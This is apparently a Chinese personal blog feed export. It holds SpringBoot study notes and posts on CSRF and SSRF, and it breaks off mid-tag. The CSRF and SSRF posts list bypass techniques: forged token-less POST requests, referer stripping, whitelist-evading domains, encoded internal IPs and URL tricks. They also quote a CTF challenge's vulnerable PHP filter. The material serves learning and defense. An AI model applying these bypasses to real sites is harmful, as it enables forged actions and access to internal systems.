    <content type="html"><![CDATA[<p><del>这么水的东西应该不会有人看吧</del></p><h2 id="常见概念问题"><a href="#常见概念问题" class="headerlink" title="常见概念问题"></a>常见概念问题</h2><h3 id="java对象：PO-POJO-VO-BO-DAO-DTO"><a href="#java对象：PO-POJO-VO-BO-DAO-DTO" class="headerlink" title="java对象：PO&#x2F;POJO&#x2F;VO&#x2F;BO&#x2F;DAO&#x2F;DTO"></a>java对象：PO&#x2F;POJO&#x2F;VO&#x2F;BO&#x2F;DAO&#x2F;DTO</h3><p>POJO(Plain Old Java Object): 字面意思是简单的java对象<br>一般其作用是中间对象，可转化为PO、DTO、VO</p><p>JavaBean: 是一个遵循特定写法的Java类，其方法命名，构造及行为必须符合特定约定<br>这个类必须有一个无参构造函数，且这个函数是public的；<br>所有属性私有化（private）；<br>私有化的属性必须通过public类型的方法（getter和setter）暴露给其他程序<br>这个类应是可序列化的<br>作用: 通常用于封装数据，实现一些简单的功能，然后去被重用</p><p>Bean: 可重复使用的组件<br>O&#x2F;R映射: object relational mapping，用于将对象和数据绑定起来<br>PO(persistent object，持久对象): 和O&#x2F;R映射有关，是与数据库里的表的数据相映射的java对象<br>EJB(Enterprise JavaBean): 定义了一个用于开发的标准</p><h1 id="SpringBoot"><a href="#SpringBoot" class="headerlink" title="SpringBoot"></a>SpringBoot</h1><h2 id="Spring-IoC"><a href="#Spring-IoC" class="headerlink" title="Spring IoC"></a>Spring IoC</h2><h1 id="7-配置"><a href="#7-配置" class="headerlink" title="7.配置"></a>7.配置</h1><p>springboot默认配置文件名称: application，在resource目录<br>pom.xml: maven的配置文件</p><h2 id="yml"><a href="#yml" class="headerlink" title=".yml"></a>.yml</h2><p><img src="/images/jvav/1.png"></p><h2 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h2><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs yml"><span class="hljs-attr">properties:</span> <br><span class="hljs-string">server.port=8080</span><br><span class="hljs-string">server.address=127.0.0.1</span><br><span class="hljs-string">yaml&amp;yml:</span><br><span class="hljs-attr">server:</span><br>    <span class="hljs-attr">port:</span> <span class="hljs-number">8080</span><br>    <span class="hljs-attr">address:</span> <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span><br></code></pre></td></tr></table></figure><p>缩进时8能用tab，只有空格<br>纯量(常量): </p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs yml"><span class="hljs-attr">msg1:</span> <span class="hljs-string">&#x27;H3y \n fuCk U !&#x27;</span> <span class="hljs-comment"># 单引忽略转义</span><br><span class="hljs-attr">msg1:</span> <span class="hljs-string">&quot;H3y \n fuCk U !&quot;</span> <span class="hljs-comment"># 双引识别转义</span><br></code></pre></td></tr></table></figure><p>对象: 参上<br>数组: </p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs yml"><span class="hljs-attr">address:</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">Beijing</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">shanghai</span><br><span class="hljs-attr">address:</span> [<span class="hljs-string">beijing</span>, <span class="hljs-string">shanghai</span>]<br></code></pre></td></tr></table></figure><p>参数引用: </p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs yml"><span class="hljs-attr">name:</span> <span class="hljs-string">d1ck</span><br><span class="hljs-attr">student:</span> <br>    <span class="hljs-attr">name:</span> <span class="hljs-string">$&#123;name&#125;</span> <span class="hljs-comment"># 引用，value= d1ck</span><br>    <span class="hljs-attr">age:</span> <span class="hljs-number">18</span><br></code></pre></td></tr></table></figure><h3 id="引用yml"><a href="#引用yml" class="headerlink" title="引用yml"></a>引用yml</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//法1</span><br><span class="hljs-meta">@Value(&quot;$&#123;server.port&#125;&quot;)</span> <span class="hljs-comment">//对象</span><br><span class="hljs-keyword">private</span> String name; <br><span class="hljs-meta">@Value(&quot;$(address[0])&quot;)</span>  <span class="hljs-comment">//数组</span><br><span class="hljs-keyword">private</span>(<span class="hljs-string">&quot;$&#123;address&#125;&quot;</span>);<br><span class="hljs-comment">//法2</span><br><span class="hljs-meta">@Autowired</span>              <span class="hljs-comment">//自动装配&quot;（Auto-wiring）</span><br><span class="hljs-keyword">private</span> Environment env1;         <span class="hljs-comment">//此处用org.springframework.core.env</span><br>System.out.println(env1.getProperty(<span class="hljs-string">&quot;address[0]&quot;</span>));<span class="hljs-comment">//用getProperty(String)</span><br><span class="hljs-comment">//法3</span><br><span class="hljs-meta">@Componment</span><br><span class="hljs-meta">@ConfigurationProperties(prefix=&quot;person&quot;)</span>  <span class="hljs-comment">//将yml对象注入java对象，前缀=person</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Student</span>&#123;<br>    <span class="hljs-keyword">private</span> String name;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> age;<br>    <span class="hljs-keyword">private</span> <br>&#125;<br><span class="hljs-meta">@Autowired</span><br><span class="hljs-keyword">private</span> Student J0hn；<br><br></code></pre></td></tr></table></figure><h2 id="profile配置"><a href="#profile配置" class="headerlink" title="profile配置"></a>profile配置</h2><h3 id="多profile文件"><a href="#多profile文件" class="headerlink" title="多profile文件"></a>多profile文件</h3><p>application-dev: 一般指开发环境的配置   application-test    application-pro: 生产(product)环境 </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">spring.profiles.active=dev<br></code></pre></td></tr></table></figure><h3 id="yml文档"><a href="#yml文档" class="headerlink" title="yml文档"></a>yml文档</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java">---<br>server:<br>  port: <span class="hljs-number">8081</span><br>spring:<br>  profiles: dev<br>---<br>server:<br>  port: <span class="hljs-number">8082</span><br>spring:<br>  profiles: test<br>---<br></code></pre></td></tr></table></figure><h3 id="项目配置加载顺序"><a href="#项目配置加载顺序" class="headerlink" title="项目配置加载顺序"></a>项目配置加载顺序</h3><p><img src="/images/jvav/3.png"><br>(4个文件都会生效，1，2，3都有的，从1里找)</p><h1 id="15"><a href="#15" class="headerlink" title="15"></a>15</h1><h2 id="junit"><a href="#junit" class="headerlink" title="junit"></a>junit</h2><h2 id="redis"><a href="#redis" class="headerlink" title="redis"></a>redis</h2><h1 id="store"><a href="#store" class="headerlink" title="store"></a>store</h1><p>依赖: lombok、spring web(构建web层)、mysql driver</p><p>报错: java: 警告: 源发行版 17 需要目标发行版 17<br>warn: 在项目结构里切换了SDK，但是没有用，后来改了字节码，将其设置为11，然后用JDK17环境运行</p><h2 id="git"><a href="#git" class="headerlink" title="git"></a>git</h2><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">git <span class="hljs-keyword">add </span>.<br>git commit -am <span class="hljs-string">&quot;f1rst_commit&quot;</span><br>git remote <span class="hljs-keyword">add </span><span class="hljs-keyword">origin </span><span class="hljs-string">&quot;url&quot;</span><br>git push -u <span class="hljs-keyword">origin </span>master<br></code></pre></td></tr></table></figure><p>切换分支: 把master分支复制过来，新建v1.0分支(没人用master开发)</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">git checkout -<span class="hljs-keyword">b </span><span class="hljs-built_in">v1</span>.<span class="hljs-number">0</span> <span class="hljs-keyword">origin/master</span><br><span class="hljs-keyword"></span>git push <span class="hljs-keyword">origin </span>HEAD -u<br></code></pre></td></tr></table></figure><h2 id="Controller"><a href="#Controller" class="headerlink" title="Controller"></a>Controller</h2><p>注解: @RestController、@RequestMapping(“url”)</p><p>ctrl+f9: 在只修改代码的时候不需要重新停止运行，类似热部署</p><h3 id="数据库部分"><a href="#数据库部分" class="headerlink" title="数据库部分"></a>数据库部分</h3><p>mybatis: 不会就看<a href="https://baomidou.com/pages/24112f/">官网</a><br>@MapperScan(“com.mystore.mystoreapi.persistence”): </p><p>lombok<br>Junit: 当JUnit运行时，它会自动运行所有标记为@Test的方法，并收集这些方法的运行结果，以此来确定测试是否通过。</p><h3 id="用户模块"><a href="#用户模块" class="headerlink" title="用户模块"></a>用户模块</h3><h2 id="ch2存档"><a href="#ch2存档" class="headerlink" title="ch2存档"></a>ch2存档</h2><p>用户表设计：要有时间戳</p>]]></content>
    
    
    <categories>
      
      <category>寄科</category>
      
      <category>开发</category>
      
    </categories>
    
    
    <tags>
      
      <tag>寄科</tag>
      
      <tag>开发</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>csrf漏洞学习</title>
    <link href="/2022/08/01/csrf%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/"/>
    <url>/2022/08/01/csrf%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<p>啊猜猜👴这几天干啥去了</p><span id="more"></span><h1 id="与话题无关的一个吐槽"><a href="#与话题无关的一个吐槽" class="headerlink" title="与话题无关的一个吐槽"></a>与话题无关的一个吐槽</h1><p>吐槽一下<strong>效率极其拉跨</strong>的联想售后😓，以及1次 <strong>愉快</strong> 的售后体验</p><p>电脑出了点<strong>小问题</strong>，网上搜了下这种<strong>小问题</strong>大概80–100r，于是👴出去找联想售后，然后人家检查了一遍告诉👴，我们作为技术人员其实p也不会只会换主板，所以不管啥问题，你只需要掏<strong>区区380r</strong>换个主板就阔以修好了啦，而且如果不你不打算掏这冤枉钱而是想花80r去电器店修，那么你的联想保修就失效辣！我们可没有强迫你哦<br><img src="/images/%E8%A1%A8%E6%83%85%E5%8C%85/%E9%9C%87%E6%83%8A.gif"></p><p>我无可奈何，然后他告诉我主板到货大概要几天，留了我手机号就让我回去等了。由于没钱，所以没法出去玩，于是在宿舍摆了几天大烂😓。可气的是，售后说大概3天就到货了，结果拖来拖去硬是让👴等了6天🤬wnm….<br><img src="/images/%E8%A1%A8%E6%83%85%E5%8C%85/%E4%B8%AD%E6%8C%87.jpg"></p><p>第六天👴彻底不想等了，开始收拾行李离校，顺便去店里准备强行拿电脑+来个撕逼大战。当👴打开手机录音以便保存犯罪证据，走进店里正准备发作，售后小哥信誓旦旦告诉我下午就能到，👴最后信他一次，坐在店里等<br>然后等的过程中👴打开电脑奇迹的发现，这玩意它自己好了???!! 于是趁售后不在带电脑去楼下电器维修检查，人家瞅了瞅告诉我电脑接口没问题，可能只是进水，干了就好了….<br><img src="/images/%E8%A1%A8%E6%83%85%E5%8C%85/wtm.png"><br>然后这时候👴想了下: 那既然好了还花钱修什么电脑，这辣鸡服务让👴8爽地等了这么久，👴现在想一走了之了</p><p>但是👴又想发作一下，于是没直接跑路，而是选择回店里当面通知售后，于是发生了以下对话</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-section">我: 既然电脑检查的没问题，那这电脑👴8修了</span><br><span class="hljs-section">售后: 8行啊兄弟，这货都已经寄来了，突然说不换，主板我咋处理</span><br><span class="hljs-section">我: 哦，主板咋处理是吧，要不拿它捅你的ass♂吧，6天才到货还好意思问我咋办</span><br><br>然后就是售后破防，没准会触发肢体冲突事件，但他拿👴估计是无可奈何的，事后👴满意地潇洒离去...<br></code></pre></td></tr></table></figure><p><img src="/images/%E8%A1%A8%E6%83%85%E5%8C%85/%E6%89%BE%E6%89%93.gif"><br>啊当然上述情况都没有发生，我本打算这么说发作一波的，但实际上发生的是这样的</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-section">我: 既然电脑检查的没问题，那这电脑👴8修了</span><br><span class="hljs-section">售后(若有所思): 哦，这样啊，那我把主板退回去吧，你可以走了</span><br><span class="hljs-section">我(懵逼): 啊????</span><br><br>然后找不到茬、等了1下午的我就这么拖行李走了....<br></code></pre></td></tr></table></figure><p>事后回想，莫名其妙干等6天啥也没干的我突然有种小丑的感觉<br><img src="/images/%E8%A1%A8%E6%83%85%E5%8C%85/%E5%B0%8F%E4%B8%91.jpg"></p><h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><p>啊那么p话少说，总之👴宝贵的假期时间就这么晃过去了，现在开始要重新更新啦<br>参考链接: <a href="https://www.jianshu.com/p/7f33f9c7997b">浅谈csrf</a></p><p>csrf，跨站请求伪造，利用社会成功学诱导用户点击构造的恶意链接，在用户8知情的情况下让用户对网站完成某些操作</p><p>比如csrf的工具CSRFTester，其原理就是访问1个页面，然后抓捕其html页面，然后自己修改它构造钓鱼界面，诱导用户点击<br>满足csrf，被钓鱼用户需要满足以下条件:<br>登录受信任网站A，并在本地生成Cookie<br>在不登出A的情况下，访问危险网站B</p><h1 id="csrf防御"><a href="#csrf防御" class="headerlink" title="csrf防御"></a>csrf防御</h1><h2 id="referer头"><a href="#referer头" class="headerlink" title="referer头"></a>referer头</h2><p>验证请求是否是用户自愿发起，可以通过检查referer头来判断，如果referer头是来自自己的网站，则可以信任，否则则可能是黑客的钓鱼网站<br>8过这个referer难道无法被篡改吗? 查了1下其实是可以的: “Referer 的值是由浏览器提供的，虽然 HTTP 协议上有明确的要求，但是每个浏览器对于 Referer 的具体实现可能有差别，并不能保证浏览器自身没有安全漏洞。使用验证 Referer 值的方法，就是把安全性都依赖于第三方（即浏览器）来保障”</p><p>于是对于一些浏览器，就有方法可以篡改cookie，比如IE(拒绝IE，从我做起)</p><h2 id="添加token"><a href="#添加token" class="headerlink" title="添加token"></a>添加token</h2><p>抵御 CSRF，关键在于在请求中放入黑客所不能伪造的信息，且该信息不存于 cookie 之中<br>可以在 HTTP 请求中以参数的形式(get&#x2F;post)加入一个随机产生的 token，并在服务器端建立一个拦截器来验证这个 token，token 可以在用户登陆后产生并放于 session 之中</p><p>这样的缺点是1个网站里可接受请求的地方非常多，对每个请求都加token很麻烦且容易漏掉<br>还有1个问题是token可能被获取: </p><h2 id="在-HTTP-头中自定义属性并验证"><a href="#在-HTTP-头中自定义属性并验证" class="headerlink" title="在 HTTP 头中自定义属性并验证"></a>在 HTTP 头中自定义属性并验证</h2><p>这种方法也是使用 token 并进行验证，不同的是，这里并不是把 token 以参数的形式置于HTTP请求中，而是放到 HTTP 头中自定义的属性里。通过 XMLHttpRequest 这个类，可以一次性给所有该类请求加上 csrftoken 这个 HTTP 头属性，并把 token 值放入其中<br>总之就是没啥缺点，但是十分麻烦</p><h1 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h1><p>总结，感觉就像是盲猜一样，1个1个试<br>1.Refere为空条件下</p><h2 id="空token"><a href="#空token" class="headerlink" title="空token"></a>空token</h2><p>删除token参数或发送空token<br>不发送token也可以正常请求数据是因为这种逻辑错误在应用程序中非常常见：应用程序有时会在token存在的时候或者token参数不为空的时候检查token的有效性。这种情况下，如果一个请求不包含token或者token值为空，那么也是有可能绕过CSRF的防御的</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs routeros">合法: <br>POST /change_password<br>POST body:<br><span class="hljs-attribute">new_password</span>=qwerty &amp;<span class="hljs-attribute">csrf_tok</span>=871caef0757a4ac9691aceb9aad8b65b<br>伪造: <br>POST /change_password<br>POST body:<br><span class="hljs-attribute">new_password</span>=qwerty<br>或: <br>POST /change_password<br>POST body:<br><span class="hljs-attribute">new_password</span>=qwerty&amp;csrf_tok=<br></code></pre></td></tr></table></figure><h2 id="用其他session"><a href="#用其他session" class="headerlink" title="用其他session"></a>用其他session</h2><p>应用程序可能只是检查token是否合法，但是不检查token是否确实归属于当前用户。这种情况，那么你可以试试把自己的token贴在payload里</p><h2 id="移除referer"><a href="#移除referer" class="headerlink" title="移除referer"></a>移除referer</h2><p>可以试试往页面添加以下代码移除referer</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span> =<span class="hljs-string">“referrer”content</span> =<span class="hljs-string">“no-referrer”</span>&gt;</span><br></code></pre></td></tr></table></figure><h2 id="正则表达绕过域名"><a href="#正则表达绕过域名" class="headerlink" title="正则表达绕过域名"></a>正则表达绕过域名</h2><p>也许referer检查是基于白名单的，那么就阔以正则表达式绕过，想办法在你的钓鱼网站域名里加白名单<br>在后面加域名 qq.com &#x3D;&gt; qq.com.abc.com<br>将域名拼接 abc.qq.com &#x3D;&gt; abc_qq.com<br>在前面或者在后面加字符 qq.com &#x3D;&gt; abcqq.com &#x2F; qq.com &#x3D;&gt; qq.comabc.com &#x2F; qq.com &#x3D;&gt; abc.com&#x2F;qq.com</p><h2 id="配合xss使用"><a href="#配合xss使用" class="headerlink" title="配合xss使用"></a>配合xss使用</h2><p>参考: <a href="https://blog.csdn.net/weixin_50464560/article/details/120581841">链接</a></p><p>更多还在学，靶场还在搭，有优先级更高的事要做，先挖个坑…</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>ssrf漏洞姿势</title>
    <link href="/2022/07/13/ssrf%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/"/>
    <url>/2022/07/13/ssrf%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<p>SSRF(Server-Side Request Forgery:服务器端请求伪造)是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF攻击的目标是从外网无法访问的内部系统</p><span id="more"></span><p>参考链接: <a href="https://xz.aliyun.com/t/2115">link</a></p><h1 id="扫盲"><a href="#扫盲" class="headerlink" title="扫盲?"></a>扫盲?</h1><h2 id="可能出现的地方"><a href="#可能出现的地方" class="headerlink" title="可能出现的地方"></a>可能出现的地方</h2><p>需要上传网址的地方，比如: 社交分享功能：获取超链接的标题等内容进行显示; 在线翻译：给网址翻译对应网页的内容</p><h2 id="漏洞验证"><a href="#漏洞验证" class="headerlink" title="漏洞验证"></a>漏洞验证</h2><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs dts">查看源代码是否在本地进行了资源请求，比如: <br><span class="hljs-symbol">https:</span><span class="hljs-comment">//www.xxx.com/a.php?image=(地址)</span><br>就可能存在SSRF漏洞<br></code></pre></td></tr></table></figure><p>dnslog等工具测试<br>等待继续总结……</p><h1 id="常见绕过"><a href="#常见绕过" class="headerlink" title="常见绕过"></a>常见绕过</h1><h2 id="绕过"><a href="#绕过" class="headerlink" title="@绕过"></a>@绕过</h2><p>下面实战部分有解释</p><h2 id="ip地址转换绕过"><a href="#ip地址转换绕过" class="headerlink" title="ip地址转换绕过"></a>ip地址转换绕过</h2><p>有些防护会对内网ip地址做正则匹配，如: 127.0.0.1\192.168.0.1这些，这时候可以把这些ip数字改成其他形式，如:<br>192.168.0.1<br>(1)8进制格式：0300.0250.0.1<br>(2)16进制格式：0xC0.0xA8.0.1<br>(3)10进制整数格式：3232235521<br>(4)16进制整数格式：0xC0A80001<br>127.0.0.1<br>8进制: 0177.0.0.1<br>16进制: 0x7F.0.0.1<br>10进制整数格式:<br>16进制整数格式:</p><h2 id="短网址绕过"><a href="#短网址绕过" class="headerlink" title="短网址绕过"></a>短网址绕过</h2><p>什么是短网址捏？自行百度，网上有网址转化短网址的在线工具<br>如(<a href="http://www.baidu.com)与(https//dwz.lc/2fGYWaE)%E4%B8%80%E6%A0%B7">www.baidu.com)与(https://dwz.lc/2fGYWaE)一样</a></p><h2 id="利用问号绕过限制"><a href="#利用问号绕过限制" class="headerlink" title="利用问号绕过限制"></a>利用问号绕过限制</h2><p>比如：<a href="http://www.aaa.com/acb?Url=http://login.aaa.com">http://www.aaa.com/acb?Url=http://login.aaa.com</a> 这是一个跳转链接，跳转到它的二级域名下，那么如何进行二级域名的绕过呢？<br>其实就是放到它自身的域名前面也就是你添加的想要跳转的域名的后面，如：<a href="http://www.aaa.com/acb?Url=http://test.com?login.aaa.com">http://www.aaa.com/acb?Url=http://test.com?login.aaa.com</a> 那么，它其实是会跳转到这个test.com域名的，而这个域名自然就是你想跳转的域名辽。跳转后，问号和问号后面的内容会变为这样：<a href="http://www.test.com/?login.aaa.com">http://www.test.com/?login.aaa.com</a></p><h2 id="ip的特殊省略"><a href="#ip的特殊省略" class="headerlink" title="ip的特殊省略"></a>ip的特殊省略</h2><p>eg: 127.0.0.1–&gt;127.1</p><h2 id="ip黑名单过滤的绕过"><a href="#ip黑名单过滤的绕过" class="headerlink" title="ip黑名单过滤的绕过"></a>ip黑名单过滤的绕过</h2><p>见下面实战</p><h1 id="简单实战"><a href="#简单实战" class="headerlink" title="简单实战"></a>简单实战</h1><h2 id="buuctf-第二章-web进阶-SSRF-Training"><a href="#buuctf-第二章-web进阶-SSRF-Training" class="headerlink" title="buuctf[第二章 web进阶]SSRF Training"></a>buuctf[第二章 web进阶]SSRF Training</h2><p>进入页面，查看php源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span> <br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">check_inner_ip</span>(<span class="hljs-params"><span class="hljs-variable">$url</span></span>) </span>&#123; <span class="hljs-comment">//检查是否是内网</span><br>    <span class="hljs-variable">$match_result</span>=<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/^(http|https)?:\/\/.*(\/)?.*$/&#x27;</span>,<span class="hljs-variable">$url</span>); <span class="hljs-comment">// http/https ://</span><br>    <span class="hljs-keyword">if</span> (!<span class="hljs-variable">$match_result</span>) &#123; <br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;url fomat error&#x27;</span>); <br>    &#125; <br>    <span class="hljs-keyword">try</span>&#123; <br>        <span class="hljs-variable">$url_parse</span>=<span class="hljs-title function_ invoke__">parse_url</span>(<span class="hljs-variable">$url</span>); <span class="hljs-comment">//搜索到了parse_url的解析和绕过</span><br>    &#125;<br>    <span class="hljs-keyword">catch</span>(<span class="hljs-built_in">Exception</span> <span class="hljs-variable">$e</span>)&#123; <br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;url fomat error&#x27;</span>); <br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>; <br>    &#125;<br>    <span class="hljs-variable">$hostname</span>=<span class="hljs-variable">$url_parse</span>[<span class="hljs-string">&#x27;host&#x27;</span>];  <span class="hljs-comment">//host: 域名</span><br>    <span class="hljs-variable">$ip</span>=<span class="hljs-title function_ invoke__">gethostbyname</span>(<span class="hljs-variable">$hostname</span>);  <span class="hljs-comment">//通过域名获取ip地址</span><br>    <span class="hljs-variable">$int_ip</span>=<span class="hljs-title function_ invoke__">ip2long</span>(<span class="hljs-variable">$ip</span>); <span class="hljs-comment">//将 IPV4 的字符串互联网协议转换成长整型数字</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">ip2long</span>(<span class="hljs-string">&#x27;127.0.0.0&#x27;</span>)&gt;&gt;<span class="hljs-number">24</span> == <span class="hljs-variable">$int_ip</span>&gt;&gt;<span class="hljs-number">24</span> || <span class="hljs-title function_ invoke__">ip2long</span>(<span class="hljs-string">&#x27;10.0.0.0&#x27;</span>)&gt;&gt;<span class="hljs-number">24</span> == <span class="hljs-variable">$int_ip</span>&gt;&gt;<span class="hljs-number">24</span> || <span class="hljs-title function_ invoke__">ip2long</span>(<span class="hljs-string">&#x27;172.16.0.0&#x27;</span>)&gt;&gt;<span class="hljs-number">20</span> == <span class="hljs-variable">$int_ip</span>&gt;&gt;<span class="hljs-number">20</span> || <span class="hljs-title function_ invoke__">ip2long</span>(<span class="hljs-string">&#x27;192.168.0.0&#x27;</span>)&gt;&gt;<span class="hljs-number">16</span> == <span class="hljs-variable">$int_ip</span>&gt;&gt;<span class="hljs-number">16</span>; <span class="hljs-comment">//$int_ip==127.0.0.0||10.0.0.0||172.16.0.0||192.168.0.0</span><br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">safe_request_url</span>(<span class="hljs-params"><span class="hljs-variable">$url</span></span>)</span>&#123; <br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">check_inner_ip</span>(<span class="hljs-variable">$url</span>)) &#123; <br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$url</span>.<span class="hljs-string">&#x27; is inner ip&#x27;</span>; <br>    &#125; <br>    <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable">$ch</span> = <span class="hljs-title function_ invoke__">curl_init</span>(); <span class="hljs-comment">//curl_init(): 初始化1个url会话(顾名思义)</span><br>        <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_URL, <span class="hljs-variable">$url</span>); <span class="hljs-comment">//设置url</span><br>        <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="hljs-number">1</span>); <span class="hljs-comment">//将其设置为1，可以获取返回值</span><br>        <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_HEADER, <span class="hljs-number">0</span>);  <span class="hljs-comment">//你tm翻译这些干啥？ </span><br>        <span class="hljs-variable">$output</span> = <span class="hljs-title function_ invoke__">curl_exec</span>(<span class="hljs-variable">$ch</span>); <span class="hljs-comment">//执行</span><br>        <span class="hljs-variable">$result_info</span> = <span class="hljs-title function_ invoke__">curl_getinfo</span>(<span class="hljs-variable">$ch</span>);<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$result_info</span>[<span class="hljs-string">&#x27;redirect_url&#x27;</span>]) &#123; <br>            <span class="hljs-title function_ invoke__">safe_request_url</span>(<span class="hljs-variable">$result_info</span>[<span class="hljs-string">&#x27;redirect_url&#x27;</span>]);<br>        &#125;<br>        <span class="hljs-title function_ invoke__">curl_close</span>(<span class="hljs-variable">$ch</span>); <br>        <span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$output</span>); <br>    &#125;<br>     <span class="hljs-comment">//return值呢？</span><br>&#125;<br><br><span class="hljs-variable">$url</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;url&#x27;</span>]; <br><span class="hljs-keyword">if</span>(!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$url</span>))&#123; <br>    <span class="hljs-title function_ invoke__">safe_request_url</span>(<span class="hljs-variable">$url</span>); <br>&#125; <br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>url构成参考这个<a 